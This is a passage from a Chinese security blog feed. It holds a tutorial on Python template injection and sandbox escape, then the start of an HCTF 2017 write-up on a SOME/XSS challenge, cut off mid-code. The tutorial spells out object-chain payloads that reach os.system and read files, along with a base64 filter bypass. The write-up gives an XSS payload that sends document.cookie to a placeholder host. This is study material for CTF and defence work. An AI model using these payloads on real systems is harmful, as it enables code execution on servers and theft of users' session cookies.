class="line">&gt;&gt;&gt; class Bar(Foo):</span><br><span class="line">...     pass</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; print Foo.__subclasses__()</span><br><span class="line">[&lt;class &apos;__main__.Bar&apos;&gt;]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure><p>那么<code>__subclasses__()</code>其实的作用就是返回object的所有弱子类方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()</span><br></pre></td></tr></table></figure></p><p>对于右边的[40]相信在看完3后应该都会比较了解了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line">&lt;type &apos;file&apos;&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;__main__.Foo&apos;&gt;]</span><br></pre></td></tr></table></figure><p><code>().__class__.__bases__[0].__subclasses__()[40]</code>没错就是要返回file对象</p><blockquote><p>需要提醒的是<code>__subclasses__()</code>方法返回的是一个列表</p></blockquote><p>至于为什么要返回file对象，其实这里主要是看我们自己的需要的。</p><p>所以这里的思路就是<br>1.通过<code>__class__</code>返回对应类型<br>2.通过<code>__bases__[0]</code>返回基类object<br>3.通过<code>__subclasses__()</code>方法找到我们需要的类</p><p>刚刚在找资料的时候发现有一篇cl0und@Syclover师傅的也总结的很好,同样也可以看看</p><blockquote><p><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a></p></blockquote><h4 id="1-5-Python-的内建函数"><a href="#1-5-Python-的内建函数" class="headerlink" title="1.5 Python 的内建函数"></a>1.5 Python 的内建函数</h4><p>在 Python 中，不引入直接使用的内置函数被成为 builtin 函数，<br>我们可以通过可以通过<code>dir __builtin__</code>来获取内置函数列表</p><p>可以在python文档中查询python的内置方法</p><blockquote><p><a href="https://docs.python.org/2/library/stdtypes.html" target="_blank" rel="noopener">https://docs.python.org/2/library/stdtypes.html</a></p></blockquote><p>所以我们<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[0].__subclasses__()[40])</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__doc__&apos;, &apos;__enter__&apos;, &apos;__exit__&apos;, &apos;__format__&apos;, &apos;__getattribute__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__iter__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;close&apos;, &apos;closed&apos;, &apos;encoding&apos;, &apos;errors&apos;, &apos;fileno&apos;, &apos;flush&apos;, &apos;isatty&apos;, &apos;mode&apos;, &apos;name&apos;, &apos;newlines&apos;, &apos;next&apos;, &apos;read&apos;, &apos;readinto&apos;, &apos;readline&apos;, &apos;readlines&apos;, &apos;seek&apos;, &apos;softspace&apos;, &apos;tell&apos;, &apos;truncate&apos;, &apos;write&apos;, &apos;writelines&apos;, &apos;xreadlines&apos;]</span><br></pre></td></tr></table></figure><p>那么那么其实<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure></p><p>这个payload的意思是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(r&apos;C:\1.php&apos;).read()</span><br></pre></td></tr></table></figure></p><h4 id="常见payload2"><a href="#常见payload2" class="headerlink" title="常见payload2"></a>常见payload2</h4><p>我们再说说一些常见payload，虽然所从表面看我们大概能看出这些payload是用来干什么的但是一些细节可能还不是非常清楚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python2：</span><br><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&apos;os.system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3：</span><br><span class="line">&apos; &apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;]</span><br><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;]</span><br></pre></td></tr></table></figure><h4 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h4><p>我们再讲下下面这个payload<br><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure><p>对于前面这一段应该都比较清楚了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71]</span><br><span class="line">&lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">[].__class__.__base__.__subclasses__()[76]</span><br><span class="line">&lt;class &apos;site.Quitter&apos;&gt;</span><br></pre></td></tr></table></figure><p>又有一个疑惑出来了这个<code>&lt;class &#39;site._Printer&#39;&gt;</code> <code>&lt;class &#39;site.Quitter&#39;&gt;</code> 是什么东西？？？为什么要引用这个类呢？</p><p>对于site.xxx我个人是理解为引入此模块中的一些附加的内置函数。</p><p>其实这两段payload的目的是要引入import os模块</p><h4 id="2-2-init-globals"><a href="#2-2-init-globals" class="headerlink" title="2.2 __init__.__globals__"></a>2.2 <code>__init__.__globals__</code></h4><p>那么<code>__init__.__globals__</code>这又是什么意思呢？</p><p><code>__init__</code><br><code>__init__</code>为控制的是类生成的对象，举个例子更好理解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...     def __init__(self,name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...         print &quot;init&quot;</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; if __name__ == &apos;__main__&apos;:</span><br><span class="line">...     user = User(&quot;test&quot;)</span><br><span class="line">... </span><br><span class="line">init</span><br></pre></td></tr></table></figure></p><p><code>__globals__</code><br>函数名.<code>__globals__</code>对包含函数全局变量的字典进行引用，换句话说就是返回一个当前空间下能使用的模块，方法和变量的字典。</p><p>所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;]</span><br></pre></td></tr></table></figure></p><p>这段其实就是为了导入os模块，至于为什么要导入os模块，os 模块提供了非常丰富的方法用来处理文件和目录。所以os模块的重要性不言而喻了吧？</p><p>至于如何搜索哪个site.xx中有os模块这里提供一个脚本</p><p>我自己懒得重写了，来自bendawang师傅</p><blockquote><p><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">cnt=0</span><br><span class="line">for item in [].__class__.__base__.__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">        if &apos;os&apos; in item.__init__.__globals__:</span><br><span class="line">            print cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">    except:</span><br><span class="line">        print &quot;error&quot;,cnt,item</span><br><span class="line">        cnt+=1</span><br><span class="line">        continue</span><br></pre></td></tr></table></figure><p>最终会发现只有site.Quitter，与site._Printer中有os模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">71 &lt;class &apos;site._Printer&apos;&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">76 &lt;class &apos;site.Quitter&apos;</span><br></pre></td></tr></table></figure></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>那么下面这个payload又是什么意思呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)</span><br></pre></td></tr></table></figure></p><p><code>&quot;&quot;.__class__.__mro__[-1]</code><br>毫无疑问也同样是要引入object对象</p><p><code>__mro__</code></p><p>递归地显示父类一直到 object<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__</span><br><span class="line">(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1]</span><br><span class="line">&lt;type &apos;object&apos;&gt;</span><br></pre></td></tr></table></figure><p>那么<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br><code>[&#39;__builtins__&#39;]</code> 是什么意思呢？？？<br>首先我们需要知道在 Python 中导入模块的方法通常有三种（xxx 为模块名称）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. import xxx</span><br><span class="line">2. from xxx import *</span><br><span class="line">3. __import__(&apos;xxx&apos;)</span><br></pre></td></tr></table></figure></p><p>当我们不能导入模块，或者想要导入的模块被禁，那么我们只能寻求 Python 本身内置函数（即通常不用人为导入，Python 本身默认已经导入的函数）。<br>随着 builtin 这个模块自动引入到环境中。</p><p>其实这里的<code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;]</code><br>与<code>__builtins__</code><br>其实还是有所区别的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__</span><br><span class="line">&lt;module &apos;__builtin__&apos; (built-in)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;]</span><br><span class="line">&#123;&apos;bytearray&apos;: &lt;type &apos;bytearray&apos;&gt;, &apos;IndexError&apos;: &lt;type &apos;exceptions.IndexError&apos;&gt; ...........</span><br></pre></td></tr></table></figure><p>对于<code>__builtins__</code>我们如何引入的模块呢？我们可以通过 dict 引入我们想要引入的模块。dict 的作用是列出一个模组  类  对象 下面 所有的属性和函数。<br>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;__import__&apos;](&apos;os&apos;)</span><br><span class="line">&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure></p><p>当然我们可以通过换种方式来绕过限制，比如使用base64加密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)</span><br><span class="line">&apos;X19pbXBvcnRfXw==&apos;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)</span><br><span class="line">&apos;b3M=&apos;</span><br></pre></td></tr></table></figure></p><p>然后通过 dict 引用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;))</span><br></pre></td></tr></table></figure></p><p>毫无疑问<br><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></p><p>这段其实作用和之前的是一样的</p><p>这里我们同样讲解下eval<br>eval()函数十分强大，官方demo解释为：将字符串str当成有效的表达式来求值并返回计算结果。<br>但是如果滥用eval（）的话就会导致如果用户恶意输入，例如：</p><p><code>__import__(&#39;os&#39;).system(&#39;dir&#39;)</code></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>下一个payload</p><p><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29]</span><br><span class="line">&lt;type &apos;builtin_function_or_method&apos;&gt;</span><br></pre></td></tr></table></figure><p>对于<code>__call__</code><br>Python中的函数的引用可以作为输入传递到其他的函数/方法中，并在其中被执行。 </p><p>这段的意思我认为是将(eval,’os.system(“ls”)’)作为内置函数执行</p><p>大概把想讲的都讲了吧</p><h3 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h3><h4 id="SSTI-in-Flask"><a href="#SSTI-in-Flask" class="headerlink" title="SSTI in Flask"></a>SSTI in Flask</h4><p>TokyoWesterns CTF 4th 2018 shrine<br>详解 </p><blockquote><p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html" target="_blank" rel="noopener">https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/</a><br><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/83999.html</a><br><a href="https://www.anquanke.com/post/id/85672" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85672</a><br><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28823933</a><br><a href="https://juejin.im/post/5a0a458951882503dc5336c1" target="_blank" rel="noopener">https://juejin.im/post/5a0a458951882503dc5336c1</a><br><a href="https://www.evget.com/article/2015/8/28/22603.html" target="_blank" rel="noopener">https://www.evget.com/article/2015/8/28/22603.html</a><br><a href="https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://hwhxy.github.io/ctf/2018/07/26/%E4%BB%8ECTF%E4%B8%AD%E5%AD%A6%E4%B9%A0%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</a><br><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/</a><br><a href="http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/" target="_blank" rel="noopener">http://cauc.me/2017/10/21/%E4%BB%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%B0%88%E8%B5%B7/</a><br><a href="https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/10/04/Python%20%E7%BC%96%E7%A8%8B%E8%BF%9B%E9%98%B6%EF%BC%88%E9%87%8D%E7%82%B9%E5%9C%A8%E4%BA%8E%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%92%8C%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95%EF%BC%89/</a><br><a href="https://xz.aliyun.com/t/2308#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308#toc-7</a><br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      这是我对Python服务端模板注入与沙盒逃逸的学习小结与实践
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="模板注入" scheme="https://museljh.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>HCTF 2017 Deserted place(SOME攻击)</title>
    <link href="https://museljh.github.io/2019/03/20/HCTF%202017%20Deserted%20place(SOME%E6%94%BB%E5%87%BB)/"/>
    <id>https://museljh.github.io/2019/03/20/HCTF 2017 Deserted place(SOME攻击)/</id>
    <published>2019-03-19T16:37:50.000Z</published>
    <updated>2019-03-19T16:46:57.807Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HCTF-2017-Deserted-place-SOME攻击"><a href="#HCTF-2017-Deserted-place-SOME攻击" class="headerlink" title="HCTF 2017 Deserted place(SOME攻击)"></a>HCTF 2017 Deserted place(SOME攻击)</h2><p>注册并登入。<br>发现change something中的message是可以进行self-xss的。<br>一般这种题目是需要获取admin的cookie，那么我们该如何做到呢？<br>首先列举下我们已知的条件。<br>1.首先我们知道something中的message可以进行self-xss比如<code>&lt;img src=&quot;1&quot; onerror=&quot;location=&#39;http://xxxx/&#39;%2bdocument.cookie&quot;&gt;</code>，<br>2.其次我们能够发现以发现在change something 会执行一个edit（）函数，如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">"./edit.php?callback=EditProfile"</span>,<span class="string">''</span>,<span class="string">'width=600,height=600'</span>);</span><br><span class="line"><span class="keyword">var</span> loop = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">  <span class="keyword">if</span>(newWin.closed) &#123;  </span><br><span class="line">    clearInterval(loop);  </span><br><span class="line">    update();</span><br><span class="line">  &#125;  </span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>并且关闭窗口时候会执行update函数<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>email = <span class="built_in">document</span>.getElementById(<span class="string">"email"</span>).innerHTML.substr(<span class="number">7</span>);</span><br><span class="line"><span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">"mess"</span>).innerHTML.substr(<span class="number">9</span>);</span><br><span class="line"><span class="keyword">var</span> csrftoken = <span class="built_in">document</span>.getElementById(<span class="string">"csrft"</span>).innerHTML.substr(<span class="number">11</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">x.open(<span class="string">'POST'</span>, <span class="string">'./api/update.php'</span>, <span class="literal">true</span>); </span><br><span class="line">x.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">x.send(<span class="string">'message='</span>+message+<span class="string">'&amp;email='</span>+email+<span class="string">'&amp;csrftoken='</span>+csrftoken);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看看子窗口的源码，一旦关闭这个页面便会将内容传给父窗口<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">UpdateProfile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> username = <span class="built_in">document</span>.getElementById(<span class="string">'user'</span>).value;</span><br><span class="line"><span class="keyword">var</span> email = <span class="built_in">document</span>.getElementById(<span class="string">'email'</span>).value;</span><br><span class="line"><span class="keyword">var</span> message = <span class="built_in">document</span>.getElementById(<span class="string">'mess'</span>).value;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span class="string">"email"</span>).innerHTML=<span class="string">"Email: "</span>+email;</span><br><span class="line"><span class="built_in">window</span>.opener.document.getElementById(<span 